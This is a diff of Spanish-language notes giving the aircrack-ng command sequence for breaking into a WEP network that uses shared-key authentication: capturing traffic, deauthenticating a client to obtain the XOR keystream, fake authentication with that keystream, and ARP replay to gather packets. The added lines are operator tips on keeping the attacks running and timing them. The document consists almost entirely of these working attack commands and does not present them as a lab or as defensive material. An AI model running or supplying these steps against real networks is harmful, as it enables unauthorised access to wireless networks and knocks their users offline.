@@ -100,15 +100,17 @@ airmon-ng check kill
 airodump-ng -c 11 --bssid $bssid -w wep_clientes_open $wlan0
 
 //Ataque de deautenticación para capturar archivo shared key XOR
-aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
+aireplay-ng -0 1 -a $bssid -c $cliente $wlan0    -- aqui sale el archivo xor
 
 sale mensaje en la captura "Got 140 bytes keystream"
 
 //Ataque de autenticación falsa con reasociación usando archivoshared key XOR
-aireplay-ng -1 60 -e $essid -a $bssid -h $wlan0_mac -y $shared_key_xor $wlan0
+aireplay-ng -1 60 -e $essid -a $bssid -h $wlan0_mac -y $shared_key_xor $wlan0   
+--se lo deja corriendo | ver que salga successfull
 
 //Ataque de ARP replay
 aireplay-ng -3 -b $bssid -h $wlan0_mac $wlan0
+--mandar este ataque dejarlo corriendo y  seguido mandar el de deautenticacion 
 
 //volver hacer la deautenticacion para que incremente la data y los paquetes de arp replay
 aireplay-ng -0 1 -a $bssid -c $cliente $wlan0
